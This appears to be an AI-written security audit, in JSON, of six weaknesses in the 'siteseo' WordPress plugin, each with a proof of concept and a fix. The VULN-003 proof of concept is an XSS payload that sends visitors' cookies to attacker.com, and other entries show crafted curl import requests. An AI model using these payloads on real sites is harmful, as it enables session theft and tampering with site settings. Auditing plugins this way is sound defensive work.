@@ -1,0 +1,92 @@
+{
+  "plugin_slug": "siteseo",
+  "review_date": "2026-06-14",
+  "reviewer": "claude-opus-security-review",
+  "verdicts": [
+    {
+      "flow_id": "siteseo-VULN-001",
+      "title": "MIME Type Spoofing in Settings Import Allows Overwrite of Security Options",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "vulnerability_class": "improper_input_validation",
+      "cvss_estimate": "4.7",
+      "auth_required": "admin",
+      "description": "The `import_settings` AJAX handler (ajax.php:142) validates the uploaded file's MIME type using `$_FILES['import_file']['type']`, which is a client-supplied value that can be freely set by the attacker. An admin can craft a multipart request with `type=application/json` containing a malicious JSON payload. Although JSON content is decoded and each value is sanitized with `sanitize_textarea_field` (stripping HTML/tags), an attacker can still inject crafted option values that alter plugin behavior — including the `siteseo_advanced_option_name` option which controls role-based access to SEO features. The server never validates the actual MIME type using `wp_check_filetype_and_ext()` or `finfo`. Critically, the `siteseo_pro_options` option is also overwritten without any schema validation, potentially enabling hidden pro features or altering plugin state. Impact is limited to admin-level users only.",
+      "affected_file": "main/ajax.php",
+      "affected_lines": "117-201",
+      "proof_of_concept": "curl -b 'wordpress_logged_in_XXXX=admin_cookie' -X POST 'https://TARGET/wp-admin/admin-ajax.php' -F 'action=siteseo_import_settings' -F 'nonce=VALID_NONCE' -F 'import_file=@malicious.json;type=application/json' where malicious.json contains: {\"siteseo_advanced_option_name\": {\"siteseo_advanced_security_metaboxe_siteseo-advanced\": {\"editor\": true}}}",
+      "remediation": "Replace client-supplied MIME type check with server-side MIME detection: use `wp_check_filetype_and_ext($imported_file, $filename)` or PHP's `finfo_file()`. Additionally, validate the imported JSON against a strict allowlist schema before calling `update_option()`."
+    },
+    {
+      "flow_id": "siteseo-VULN-002",
+      "title": "Author Sitemap Exposes Registered User Enumeration to Unauthenticated Visitors",
+      "severity": "low",
+      "confidence": "confirmed",
+      "vulnerability_class": "information_disclosure",
+      "cvss_estimate": "5.3",
+      "auth_required": "none",
+      "description": "The `generate_author_sitemap()` method (generatesitemap.php:498-541) is publicly accessible via `GET /author.xml` and retrieves all WordPress users who have `publish_posts` capability, then outputs their author profile URLs (which expose usernames) and registration dates. This makes it trivial to enumerate all authors/editors on a site without authentication. When an admin enables the author sitemap in settings, this endpoint becomes live. There are no permission checks gating this sitemap.",
+      "affected_file": "main/generatesitemap.php",
+      "affected_lines": "498-541",
+      "proof_of_concept": "curl https://TARGET/author.xml - returns XML with <loc>https://TARGET/author/username/</loc> for each author plus their last post modification date.",
+      "remediation": "Add an option to disable the author sitemap by default. Consider adding a `noindex` header or restricting it to non-admin environments. At minimum, document the user enumeration risk to site administrators."
+    },
+    {
+      "flow_id": "siteseo-VULN-003",
+      "title": "Stored XSS via Unsanitized Custom Tracking Scripts Output to All Visitors",
+      "severity": "medium",
+      "confidence": "likely",
+      "vulnerability_class": "stored_xss",
+      "cvss_estimate": "5.4",
+      "auth_required": "admin",
+      "description": "The analytics settings page allows admins with `unfiltered_html` capability to save arbitrary JavaScript in `google_analytics_other_tracking`, `google_analytics_other_tracking_body`, and `google_analytics_other_tracking_footer` options (analytics.php:1028-1033). These are stored without sanitization and output on every public page via `add_custom_head_script()`, `add_custom_body_script()`, and `add_custom_footer_script()` (googleanalytics.php:202-251). The output is wrapped in `wp_kses()` with only `<script async src type data-src-siteseo>` allowed, but `wp_kses()` with a script allowlist permits inline `<script>` content to pass through if the script tag itself is allowed. In a multisite context, a lower-privileged super admin or any user with `unfiltered_html` on a subsite could inject scripts that affect all visitors site-wide. On single-site, this is an admin-to-visitor XSS vector.",
+      "affected_file": "main/googleanalytics.php",
+      "affected_lines": "202-251",
+      "proof_of_concept": "As admin with unfiltered_html: POST to analytics settings page with siteseo_options[head_tracking]=<script>document.location='https://attacker.com/steal?c='+document.cookie</script> — this script executes for every unauthenticated visitor.",
+      "remediation": "Restrict the custom tracking code feature to `administrator` role only (not just `unfiltered_html`). Consider storing scripts as raw content but implementing a Content Security Policy. At minimum, do not allow arbitrary JS if the site operator cannot be trusted (e.g., multisite scenarios)."
+    },
+    {
+      "flow_id": "siteseo-VULN-004",
+      "title": "Unvalidated Cookie Hook Action Name Could Trigger Arbitrary WordPress Action",
+      "severity": "low",
+      "confidence": "possible",
+      "vulnerability_class": "improper_input_validation",
+      "cvss_estimate": "3.5",
+      "auth_required": "admin",
+      "description": "The cookie bar's load hook is stored in `google_analytics_hook` (analytics.php:1037) with only `sanitize_text_field()` applied. This value is later used directly as a WordPress action name in `add_action($load_cookies_bar, '\\SiteSEO\\GoogleAnalytics::render_cookie_bar')` (googleanalytics.php:58). A malicious admin could set this to any arbitrary WordPress action hook name (e.g., `wp_login`, `user_register`, or a hook that fires early in the request lifecycle), potentially causing the cookie bar HTML to render in unexpected contexts. While this is limited to admin-controlled settings, it represents a logic flaw that could be abused in privilege escalation scenarios or to cause unintended side effects.",
+      "affected_file": "main/googleanalytics.php",
+      "affected_lines": "56-59",
+      "proof_of_concept": "Set Analytics > Cookie Bar position to an arbitrary hook name like 'wp_login' via the settings POST form. The render_cookie_bar function will be attached to that hook and fire if triggered.",
+      "remediation": "Validate the hook value against an explicit allowlist of permitted action names (e.g., `wp_head`, `wp_footer`, `wp_body_open`) before passing it to `add_action()`."
+    },
+    {
+      "flow_id": "siteseo-VULN-005",
+      "title": "Settings Import Overwrites Plugin Options Including Instant Indexing API Keys Without Schema Validation",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "vulnerability_class": "broken_access_control",
+      "cvss_estimate": "4.4",
+      "auth_required": "admin",
+      "description": "The `import_settings` function (ajax.php:167-198) overwrites multiple plugin options wholesale including `siteseo_instant_indexing_option_name` (which contains Google API private keys in JSON format) and `siteseo_pro_options` without any structural or type validation. The only sanitization applied is `map_deep($settings, 'sanitize_textarea_field')` which strips HTML tags but preserves the overall structure. An admin user can import a crafted JSON file that replaces the Google Search Console API key with an attacker-controlled key, causing future URL submissions to go to the attacker's Google property. This could be used in targeted attacks where a lower-privileged admin on a shared hosting or multisite environment overwrites a higher-privileged admin's API credentials.",
+      "affected_file": "main/ajax.php",
+      "affected_lines": "165-198",
+      "proof_of_concept": "Craft a JSON file: {\"siteseo_instant_indexing_option_name\": {\"instant_indexing_google_api_key\": \"{\\\"client_email\\\":\\\"attacker@attacker.iam.gserviceaccount.com\\\",\\\"private_key\\\":\\\"...attacker_key...\\\"}\", \"engines\": {\"google\": \"1\"}}} and import via Tools > Import Settings.",
+      "remediation": "Implement strict schema validation for each imported option. Never import sensitive credentials (API keys) from an import file without explicit user confirmation. Consider separate export/import scopes that exclude sensitive credentials."
+    },
+    {
+      "flow_id": "siteseo-VULN-006",
+      "title": "Missing Server-Side Nonce Validation on close_update_notice GET Parameter Bypass",
+      "severity": "low",
+      "confidence": "confirmed",
+      "vulnerability_class": "csrf",
+      "cvss_estimate": "3.1",
+      "auth_required": "admin",
+      "description": "In admin.php (lines 37-39), the plugin registers a filter based on an unvalidated `$_GET['action']` check: `if(isset($_GET['action']) && 'siteseo_close_update_notice' === sanitize_text_field(wp_unslash($_GET['action'])))` — this check occurs unconditionally during the `hooks()` call, before any nonce verification. While the actual AJAX handler `close_update_notice` does verify a nonce (`siteseo_promo_nonce`), the filter registration path in admin.php fires purely on GET parameter presence. The inline JavaScript for this action embeds the nonce in the page source (admin.php:660), making it a predictable server-side registered filter. The overall CSRF risk is low because the filter only affects the `softaculous_plugin_update_notice` filter output, not a data-write operation.",
+      "affected_file": "main/admin.php",
+      "affected_lines": "37-39",
+      "proof_of_concept": "Visit any admin page with ?action=siteseo_close_update_notice appended to observe the filter registration without auth check.",
+      "remediation": "Move the filter registration inside the AJAX handler callback itself (after nonce verification) rather than at the hooks initialization stage. Alternatively, add `is_admin()` and `current_user_can()` checks before registering the filter."
+    }
+  ],
+  "summary": "The siteseo plugin demonstrates generally solid security practices: all AJAX handlers require authentication (no nopriv handlers), nonces are checked consistently, settings pages use check_admin_referer, and SQL queries avoid $wpdb in favor of WP API functions. No REST API endpoints are exposed. The most notable issues are: (1) Client-supplied MIME type validation in the settings import handler allows bypassing the JSON-only file restriction — though post-import sanitization limits exploitation; (2) The import functionality overwrites all plugin options including API credentials without schema validation; (3) Custom tracking script injection is technically constrained to users with unfiltered_html capability but represents stored XSS against all site visitors; (4) The author sitemap leaks user enumeration data publicly; (5) An arbitrary WordPress action hook name can be set for the cookie bar. None of these vulnerabilities are exploitable by unauthenticated users, and all require at minimum admin-level access. The plugin would benefit from server-side MIME validation, strict schema enforcement on imports, and an action name allowlist for the cookie hook."
+}
